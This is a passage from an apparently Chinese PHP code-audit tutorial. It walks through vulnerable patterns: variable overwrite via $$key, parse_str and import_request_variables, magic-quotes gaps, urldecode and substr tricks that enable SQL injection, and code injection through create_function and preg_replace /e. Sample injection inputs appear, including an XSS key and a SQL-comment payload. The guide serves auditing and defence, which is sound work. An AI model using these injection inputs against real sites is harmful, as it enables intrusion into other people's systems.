class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</span><br></pre></td></tr></table></figure><p>那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：） </p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求 : 无</td></tr><tr><td style="text-align:left">系统要求 : 无</td></tr><tr><td style="text-align:left">审计策略 : 通读代码</td></tr></tbody></table><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><hr><p>很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：</p><h3 id="遍历初始化变量"><a href="#遍历初始化变量" class="headerlink" title="遍历初始化变量"></a>遍历初始化变量</h3><p>请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//var.php?a=fuck</span></span><br><span class="line">$a=<span class="string">'hi'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$chs = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($_POST &amp;&amp; $charset != <span class="string">'utf-8'</span>) &#123;</span><br><span class="line">$chs = <span class="keyword">new</span> Chinese(<span class="string">'UTF-8'</span>, $charset);</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$$key = $chs-&gt;Convert($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($chs);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="parse-str-变量覆盖漏洞"><a href="#parse-str-变量覆盖漏洞" class="headerlink" title="parse_str()变量覆盖漏洞"></a>parse_str()变量覆盖漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?var=new</span></span><br><span class="line">$var = <span class="string">'init'</span>;                     </span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]); </span><br><span class="line"><span class="keyword">print</span> $var;</span><br></pre></td></tr></table></figure><p>该函数一样可以覆盖数组变量，上面的代码是通过$<code>_</code>SERVER[‘QUERY_STRING’]来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?var=1&amp;a[1]=var1%3d222</span></span><br><span class="line">$var1 = <span class="string">'init'</span>;</span><br><span class="line">parse_str($a[$_GET[<span class="string">'var'</span>]]);</span><br><span class="line"><span class="keyword">print</span> $var1;</span><br></pre></td></tr></table></figure><p>上面的代码通过提交$var来实现对$var1的覆盖。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（parse_str）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符parse_str</td></tr></tbody></table><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（mb_parse_str）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符mb_parse_str</td></tr></tbody></table><h3 id="import-request-variables-变量覆盖漏洞"><a href="#import-request-variables-变量覆盖漏洞" class="headerlink" title="import_request_variables()变量覆盖漏洞"></a>import_request_variables()变量覆盖漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'GLOBALS '</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"n"</span>;</span><br><span class="line">import_request_variables(<span class="string">'GPC'</span>);</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'10.1.1.1'</span>) <span class="keyword">die</span>(<span class="string">'Go away!'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello admin!'</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（import_request_variables）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符import_request_variables</td></tr></tbody></table><h3 id="PHP5-Globals"><a href="#PHP5-Globals" class="headerlink" title="PHP5 Globals"></a>PHP5 Globals</h3><p>从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//register_globals = &apos;ON&apos;</span><br><span class="line">//foo.php?GLOBALS[foobar]=HELLO</span><br><span class="line">echo $foobar; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>但是很多的程序没有考虑到这点，请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为了安全取消全局变量</span></span><br><span class="line"><span class="comment">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">'register_globals'</span>)) <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $k=&gt;$v) <span class="keyword">unset</span>($&#123;$k&#125;);</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="keyword">print</span> $_GET[b];</span><br></pre></td></tr></table></figure><p>如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="magic-quotes-gpc与代码安全"><a href="#magic-quotes-gpc与代码安全" class="headerlink" title="magic_quotes_gpc与代码安全"></a>magic_quotes_gpc与代码安全</h3><hr><h3 id="什么是magic-quotes-gpc"><a href="#什么是magic-quotes-gpc" class="headerlink" title="什么是magic_quotes_gpc"></a>什么是magic_quotes_gpc</h3><p>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：）</p><h3 id="哪些地方没有魔术引号的保护"><a href="#哪些地方没有魔术引号的保护" class="headerlink" title="哪些地方没有魔术引号的保护"></a>哪些地方没有魔术引号的保护</h3><p><em>1) $<code>_</code>SERVER变量</em></p><p>PHP5的$<code>_</code>SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（$<code>_</code>SERVER变量）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符<code>_</code>SERVER</td></tr></tbody></table><p><em>2) getenv()得到的变量（使用类似$<code>_</code>SERVER变量）</em></p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（getenv()）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符getenv</td></tr></tbody></table><p><em>3) $HTTP_RAW_POST_DATA与PHP输入、输出流</em></p><p>主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>( $HTTP_RAW_POST_DATA ) ) &#123;</span><br><span class="line">$HTTP_RAW_POST_DATA = file_get_contents( <span class="string">'php://input'</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($HTTP_RAW_POST_DATA) )</span><br><span class="line">$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（数据流）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符HTTP_RAW_POST_DATA或者php://input</td></tr></tbody></table><p><em>4) 数据库操作容易忘记’的地方如：in()/limit/order by/group by</em></p><p>如Discuz!&lt;5.0的pm.php：<br>​     </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($msgtobuddys)) &#123;</span><br><span class="line">$msgto = array_merge($msgtobuddys, <span class="keyword">array</span>($msgtoid));</span><br><span class="line">......</span><br><span class="line"><span class="keyword">foreach</span>($msgto <span class="keyword">as</span> $uid) &#123;</span><br><span class="line">$uids .= $comma.$uid;</span><br><span class="line">$comma = <span class="string">','</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">$query = $db-&gt;query(<span class="string">"SELECT m.username, mf.ignorepm FROM &#123;$tablepre&#125;members m</span></span><br><span class="line"><span class="string">LEFT JOIN &#123;$tablepre&#125;memberfields mf USING(uid)</span></span><br><span class="line"><span class="string">WHERE m.uid IN ($uids)"</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找数据库操作字符（select,update,insert等等）</td></tr></tbody></table><h3 id="变量的编码与解码"><a href="#变量的编码与解码" class="headerlink" title="变量的编码与解码"></a>变量的编码与解码</h3><p>一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。</p><p>这个类型的主要函数有：</p><p><em>1) stripslashes() 这个其实就是一个decode-addslashes()</em></p><p><em>2) 其他字符串转换函数：</em></p><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">base64_decode</td><td style="text-align:left">对使用 MIME base64 编码的数据进行解码</td></tr><tr><td style="text-align:left">base64_encode</td><td style="text-align:left">使用 MIME base64 对数据进行编码</td></tr><tr><td style="text-align:left">rawurldecode</td><td style="text-align:left">对已编码的 URL 字符串进行解码</td></tr><tr><td style="text-align:left">rawurlencode</td><td style="text-align:left">按照 RFC 1738 对 URL 进行编码</td></tr><tr><td style="text-align:left">urldecode</td><td style="text-align:left">解码已编码的 URL 字符串</td></tr><tr><td style="text-align:left">urlencode</td><td style="text-align:left">编码 URL 字符串</td></tr></tbody></table><p><em>另外一个 unserialize/serialize</em></p><p><em>3) 字符集函数（GKB,UTF7/8…）如iconv()/mb_convert_encoding()等</em></p><p>目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM article WHERE articleid='"</span>.urldecode($_GET[id]).<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure><p>当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM article WHERE articleid=<span class="string">''</span><span class="string">'</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找对应的编码函数</td></tr></tbody></table><h3 id="二次攻击"><a href="#二次攻击" class="headerlink" title="二次攻击"></a>二次攻击</h3><p><em>详细见附录 [1]</em></p><p><em>1) 数据库出来的变量没有进行过滤</em></p><p><em>2) 数据库的转义符号：</em></p><ul><li>mysql/oracle转义符号同样是\（我们提交’通过魔术引号变化为\’，当我们update进入数据库时，通过转义变为’）</li><li>mssql的转义字符为’（所以我们提交’通过魔术引号变化为\’，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义）</li></ul><p>从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="魔术引号带来的新的安全问题"><a href="#魔术引号带来的新的安全问题" class="headerlink" title="魔术引号带来的新的安全问题"></a>魔术引号带来的新的安全问题</h3><p>首先我们看下魔术引号的处理机制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\--&gt;\\,&apos;--&gt;\&apos;,&quot;--&gt;\&quot;,null--&gt;\0]</span><br></pre></td></tr></table></figure><p>这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：</p><p><em>1)得到原字符（’,\,”,null]）</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//提交                 '</span></span><br><span class="line"><span class="comment">//魔术引号处理         \'</span></span><br><span class="line"><span class="comment">//substr               '</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</span><br><span class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</span><br><span class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</span><br><span class="line">   <span class="string">" WHERE order_sn = '$order_sn' LIMIT 1"</span>;</span><br></pre></td></tr></table></figure><p><em>2)得到“\”字符</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//提交                 '</span></span><br><span class="line"><span class="comment">//魔术引号处理         \'</span></span><br><span class="line"><span class="comment">//substr               \    </span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</span><br><span class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</span><br><span class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</span><br><span class="line">   <span class="string">" WHERE order_sn = '$order_sn' and order_tn='"</span>.$_GET[<span class="string">'order_tn'</span>].<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure><p>提交内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order_sn=&apos;&amp;order_tn=%20and%201=1/*</span><br></pre></td></tr></table></figure><p>执行的SQL语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> order_id, order_status, shipping_status, pay_status, shipping_time, </span><br><span class="line">shipping_id, invoice_no, user_id <span class="keyword">FROM</span> order_info <span class="keyword">WHERE</span> order_sn = <span class="string">'\' and </span></span><br><span class="line"><span class="string">order_tn='</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">/*'</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符串处理函数如substr或者通读代码</td></tr></tbody></table><h3 id="变量key与魔术引号"><a href="#变量key与魔术引号" class="headerlink" title="变量key与魔术引号"></a>变量key与魔术引号</h3><p>我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></span><br><span class="line"><span class="comment">//print_R($_GET); </span></span><br><span class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">print</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em>1)当magic_quotes_gpc = On时，在php5.24下测试显示：</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa\<span class="string">'aaa</span></span><br><span class="line"><span class="string">bb\'b</span></span><br></pre></td></tr></table></figure><p>从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa[bb']=1 </span></span><br><span class="line">print_R($_GET); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果显示:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [aaaa<span class="string">'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) )</span></span><br></pre></td></tr></table></figure><p>数组第一维变量的key不受魔术引号的影响。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4和php&lt;5.2.1</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><p><em>2)当magic_quotes_gpc = Off时，在php5.24下测试显示：</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa<span class="string">'aaa</span></span><br><span class="line"><span class="string">bb'</span>b</span><br></pre></td></tr></table></figure><p>对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//keyvul.php?aaa'aa=1'</span></span><br><span class="line"><span class="comment">//magic_quotes_gpc = Off</span></span><br><span class="line"> <span class="keyword">if</span> (!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line"> $_GET  = addslashes_array($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_array</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'addslashes_array'</span>, $value) : addslashes($value);</span><br><span class="line">&#125;</span><br><span class="line">print_R($_GET);</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [aaa<span class="string">'aa] =&gt; 1\'</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">aaa'</span>aa</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="代码注射"><a href="#代码注射" class="headerlink" title="代码注射"></a>代码注射</h3><hr><h3 id="PHP中可能导致代码注射的函数"><a href="#PHP中可能导致代码注射的函数" class="headerlink" title="PHP中可能导致代码注射的函数"></a>PHP中可能导致代码注射的函数</h3><p>很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：</p><table><thead><tr><th style="text-align:left">函数</th></tr></thead><tbody><tr><td style="text-align:left">assert()</td></tr><tr><td style="text-align:left">call_user_func()</td></tr><tr><td style="text-align:left">call_user_func_array()</td></tr><tr><td style="text-align:left">create_function()</td></tr><tr><td style="text-align:left">变量函数</td></tr></tbody></table><p>这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//how to exp this code</span></span><br><span class="line">$sort_by=$_GET[<span class="string">'sort_by'</span>];</span><br><span class="line">$sorter=<span class="string">'strnatcasecmp'</span>;</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">'test'</span>,<span class="string">'test'</span>);</span><br><span class="line">$sort_function = <span class="string">'  return 1 * '</span> . $sorter . <span class="string">'($a["'</span> . $sort_by . <span class="string">'"], $b["'</span> . $sort_by . <span class="string">'"]);</span></span><br><span class="line"><span class="string">      '</span>;</span><br><span class="line">usort($databases, create_function(<span class="string">'$a, $b'</span>, $sort_function));</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等）</td></tr></tbody></table><h3 id="变量函数与双引号"><a href="#变量函数与双引号" class="headerlink" title="变量函数与双引号"></a>变量函数与双引号</h3><p>对于单引号和双引号的区别，很多程序员深有体会，示例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"$a\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a\n'</span>;</span><br></pre></td></tr></table></figure><p>我们再看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//how to exp this code</span></span><br><span class="line"><span class="keyword">if</span>($globals[<span class="string">'bbc_email'</span>])&#123;</span><br><span class="line"></span><br><span class="line">$text = preg_replace(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">"/\[email=(.*?)\](.*?)\[\/email\]/ies"</span>,</span><br><span class="line"><span class="string">"/\[email\](.*?)\[\/email\]/ies"</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">'check_email("$1", "$2")'</span>,</span><br><span class="line"><span class="string">'check_email("$1", "$1")'</span>), $text);</span><br></pre></td></tr></table></figure><p>另外很多的应用程序都把变量用””存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="PHP自身函数漏洞及缺陷"><a href="#PHP自身函数漏洞及缺陷" class="headerlink" title="PHP自身函数漏洞及缺陷"></a>PHP自身函数漏洞及缺陷</h3><hr><h3 id="PHP函数的溢出漏洞"><a href="#PHP函数的溢出漏洞" class="headerlink" title="PHP函数的溢出漏洞"></a>PHP函数的溢出漏洞</h3><p>大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录 [2]）项目么，其中比较有名的要算是unserialize()，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . <span class="string">'_data'</span>]);</span><br></pre></td></tr></table></figure><p>在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：对应fix的版本</td></tr><tr><td style="text-align:left">系统要求：</td></tr><tr><td style="text-align:left">审计策略：查找对应函数名</td></tr></tbody></table><h3 id="PHP函数的其他漏洞"><a href="#PHP函数的其他漏洞" class="headerlink" 